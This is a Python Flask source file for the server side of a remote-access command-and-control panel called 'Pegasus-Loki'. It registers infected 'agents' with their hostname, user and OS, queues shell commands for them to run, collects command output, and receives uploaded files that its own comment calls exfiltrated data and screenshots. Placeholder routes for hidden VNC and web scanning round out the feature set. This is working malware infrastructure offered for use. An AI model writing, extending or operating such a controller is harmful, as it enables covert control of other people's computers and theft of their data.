#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pegasus-Loki Integrated API
Single, consolidated API for both agent and web UI communication.
"""

import os
import json
import base64
import hashlib
from datetime import datetime, timedelta
from flask import (
    Blueprint, request, jsonify, abort, url_for, current_app,
    render_template, redirect
)
from html import escape
from werkzeug.utils import secure_filename

from .models import db, Agent, Command, User
from .webui import require_admin

# Attempt to import Pegasus modules
try:
    from agent.pegasus_crypto import PegasusAES, PegasusConfig
    PEGASUS_CRYPTO_AVAILABLE = True
except ImportError:
    PEGASUS_CRYPTO_AVAILABLE = False

# API Blueprint
api = Blueprint('api', __name__)

# ---
# Globals & Helpers
# ---

pegasus_crypto = None

def init_pegasus_crypto():
    """Initializes the Pegasus encryption/decryption object."""
    global pegasus_crypto
    if PEGASUS_CRYPTO_AVAILABLE and not pegasus_crypto:
        try:
            config = PegasusConfig()
            pegasus_crypto = PegasusAES(config.master_key)
            print("Pegasus crypto system initialized.")
            return True
        except Exception as e:
            print(f"Error initializing Pegasus crypto: {e}")
    return pegasus_crypto is not None

def decrypt_if_encrypted(data):
    """Decrypts incoming data if it's encrypted."""
    if not pegasus_crypto or not isinstance(data, dict):
        return data
    if 'encrypted_data' in data:
        try:
            decrypted = pegasus_crypto.decrypt(data['encrypted_data'])
            return json.loads(decrypted)
        except Exception as e:
            print(f"Decryption error: {e}")
    return data

def get_or_create_agent(agent_id, agent_info=None):
    """
    Retrieves an agent from the database or creates a new one.
    Updates agent information on every check-in.
    """
    agent = Agent.query.filter_by(agent_id=agent_id).first()
    if not agent:
        agent = Agent(agent_id=agent_id)
        db.session.add(agent)
        print(f"[+] New agent registered: {agent_id}")

    if agent_info:
        agent.hostname = agent_info.get('hostname', agent.hostname)
        agent.username = agent_info.get('username', agent.username)
        agent.operating_system = agent_info.get('platform', agent.operating_system)
        agent.remote_ip = request.remote_addr
        # Geolocation could be implemented here via an external service
        # agent.geolocation = get_geolocation(request.remote_addr)

    agent.last_online = datetime.utcnow()
    agent.status = 'online'
    db.session.commit()
    return agent

# ---
# Agent-Facing Routes
# ---

@api.route('/<string:agent_id>/hello', methods=['POST'])
def agent_hello(agent_id):
    """
    Agent check-in endpoint. The agent sends its info and receives pending commands.
    """
    init_pegasus_crypto()
    data = decrypt_if_encrypted(request.get_json())
    
    agent = get_or_create_agent(agent_id, agent_info=data)
    if not agent:
        return "Agent creation failed", 500

    command = Command.query.filter_by(agent_id=agent.id, executed=False).order_by(Command.timestamp.asc()).first()
    if command:
        command.executed = True # Mark as executed to avoid re-execution
        command.timestamp = datetime.utcnow()
        db.session.commit()
        return command.cmdline
    
    return ""

@api.route('/<string:agent_id>/report', methods=['POST'])
def agent_report(agent_id):
    """
    Receives command output or other reports from the agent.
    """
    agent = Agent.query.filter_by(agent_id=agent_id).first_or_404()
    
    # Handle both plain and encrypted reports
    data = request.form.to_dict() or request.get_json()
    output = ""
    if 'encrypted_output' in data and pegasus_crypto:
        try:
            output = pegasus_crypto.decrypt(data['encrypted_output'])
        except Exception as e:
            output = f"[Decryption error: {e}]"
    elif 'output' in data:
        output = data['output']

    if output:
        agent.output += escape(output)
        agent.last_online = datetime.utcnow()
        db.session.commit()

    return "OK"

@api.route('/<string:agent_id>/upload', methods=['POST'])
def agent_upload(agent_id):
    """Handles file uploads from agents (e.g., screenshots, exfiltrated data)."""
    agent = Agent.query.filter_by(agent_id=agent_id).first_or_404()
    
    if 'uploaded' not in request.files:
        return "No file part in request", 400
    
    file = request.files['uploaded']
    if file.filename == '':
        return "No selected file", 400

    filename = secure_filename(file.filename)
    upload_dir = os.path.join(current_app.config['UPLOAD_FOLDER'], agent.agent_id)
    os.makedirs(upload_dir, exist_ok=True)
    
    file_path = os.path.join(upload_dir, filename)
    # Avoid overwriting files
    counter = 1
    while os.path.exists(file_path):
        name, ext = os.path.splitext(filename)
        file_path = os.path.join(upload_dir, f"{name}_{counter}{ext}")
        counter += 1
        
    file.save(file_path)
    
    # Create a link for the UI and add it to the agent's console
    download_link = url_for('webui.uploads', path=f"{agent.agent_id}/{os.path.basename(file_path)}", _external=True)
    file_info = f"[*] File uploaded: <a target='_blank' href='{download_link}'>{filename}</a> ({os.path.getsize(file_path)} bytes)\n"
    agent.output += file_info
    agent.last_online = datetime.utcnow()
    db.session.commit()
    
    return "Upload successful"

# ---
# Web UI API Routes
# ---

@api.route('/agents/<int:agent_id>/console', methods=['GET'])
@require_admin
def agent_console(agent_id):
    """Returns the console output for a specific agent."""
    agent = Agent.query.get_or_404(agent_id)
    return render_template('agent_console.html', agent=agent)

@api.route('/agents/<int:agent_id>/commands', methods=['POST'])
@require_admin
def push_command(agent_id):
    """Pushes a command to an agent's queue from the web UI."""
    agent = Agent.query.get_or_404(agent_id)
    cmdline = request.form.get('cmdline')
    if not cmdline:
        return jsonify({'status': 'error', 'message': 'Command cannot be empty'}), 400
    
    agent.push_command(cmdline)
    return jsonify({'status': 'success', 'message': f'Command "{cmdline}" queued for agent {agent.display_name}.'})

@api.route('/agents/rename', methods=['POST'])
@require_admin
def rename_agent():
    """Renames an agent."""
    agent_id = request.form.get('id')
    new_name = request.form.get('newname')
    if not agent_id or not new_name:
        abort(400)
    
    agent = Agent.query.get_or_404(agent_id)
    agent.rename(new_name)
    return jsonify({'status': 'success', 'message': f'Agent renamed to {new_name}.'})

@api.route('/agents/stats')
@require_admin
def agent_stats():
    """Provides statistics about the agents."""
    total_agents = Agent.query.count()
    online_agents = sum(1 for agent in Agent.query.all() if agent.is_online())
    
    platforms = db.session.query(Agent.operating_system, db.func.count(Agent.id)).group_by(Agent.operating_system).all()
    platform_stats = {os if os else 'Unknown': count for os, count in platforms}

    return jsonify({
        'total_agents': total_agents,
        'online_agents': online_agents,
        'offline_agents': total_agents - online_agents,
        'platform_distribution': platform_stats,
        'last_updated': datetime.utcnow().isoformat()
    })

# ---
# Placeholder Tool Routes
# These can be expanded with real functionality later.
# ---

@api.route('/tools/hvnc', methods=['POST'])
@require_admin
def tool_hvnc():
    agent_id = request.json.get('agent_id')
    action = request.json.get('action')
    # Logic for starting/stopping HVNC via agent commands would go here
    return jsonify({'status': 'pending', 'message': f'HVNC action \'{action}\' for agent {agent_id} is not yet implemented.'})

@api.route('/tools/web_scanner', methods=['POST'])
@require_admin
def tool_web_scanner():
    target_url = request.json.get('url')
    # Logic for initiating a web scan would go here
    return jsonify({'status': 'pending', 'message': f'Web scan for {target_url} is not yet implemented.'})

